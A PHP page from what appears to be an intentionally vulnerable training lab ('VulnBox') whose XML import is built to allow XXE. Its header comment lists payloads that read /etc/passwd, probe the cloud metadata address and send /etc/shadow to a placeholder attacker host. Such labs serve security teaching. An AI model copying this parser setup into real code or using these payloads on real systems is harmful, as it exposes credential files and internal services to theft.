<?php
/**
 * VulnBox XML Import — Deliberately vulnerable to XXE (XML External Entity Injection)
 *
 * libxml_disable_entity_loader(false) enables external entity loading.
 * LIBXML_NOENT expands entities in the parsed document.
 *
 * Exploit (read /etc/passwd):
 *   POST /import.php HTTP/1.1
 *   Content-Type: application/xml
 *
 *   <?xml version="1.0" encoding="UTF-8"?>
 *   <!DOCTYPE foo [
 *     <!ENTITY xxe SYSTEM "file:///etc/passwd">
 *   ]>
 *   <import><data>&xxe;</data></import>
 *
 * Blind SSRF via XXE:
 *   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
 *
 * Error-based exfiltration:
 *   <!ENTITY % file SYSTEM "file:///etc/shadow">
 *   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
 */

$output = '';
$error  = '';
$input  = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $raw = file_get_contents('php://input');
    if (empty($raw) && isset($_POST['xml'])) {
        $raw = $_POST['xml'];
    }
    $input = htmlspecialchars($raw);

    if ($raw) {
        // Deliberately insecure: external entities enabled
        libxml_disable_entity_loader(false);
        $dom = new DOMDocument();
        // LIBXML_NOENT: substitute entities; LIBXML_DTDLOAD: load external DTD
        $loaded = @$dom->loadXML($raw, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
        if ($loaded) {
            $output = htmlspecialchars($dom->saveXML());
            // Also extract text content for display
            $data_nodes = $dom->getElementsByTagName('data');
            if ($data_nodes->length > 0) {
                $output = htmlspecialchars($data_nodes->item(0)->textContent);
            }
        } else {
            $error = 'XML parsing failed: ' . implode('; ', array_map(function($e){ return $e->message; }, libxml_get_errors()));
            libxml_clear_errors();
        }
    } else {
        $error = 'No XML data provided.';
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>VulnBox — XML Import</title></head>
<body>
<h1>XML Data Import</h1>
<p>Import structured data via XML. Supports external references for enterprise integrations.</p>

<form method="POST">
<textarea name="xml" rows="15" cols="80" placeholder="Paste XML here..."><?php echo $input; ?></textarea><br>
<button type="submit">Import</button>
</form>

<?php if ($output): ?>
<h2>Parsed Output</h2>
<pre style="background:#f0f0f0;padding:10px"><?php echo $output; ?></pre>
<?php endif; ?>

<?php if ($error): ?>
<p style="color:red"><strong>Error:</strong> <?php echo $error; ?></p>
<?php endif; ?>

<hr>
<h3>Example XML</h3>
<pre style="background:#f0f0f0;padding:10px">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;import&gt;
  &lt;record&gt;
    &lt;name&gt;Test User&lt;/name&gt;
    &lt;email&gt;test@example.com&lt;/email&gt;
  &lt;/record&gt;
&lt;/import&gt;
</pre>
</body>
</html>
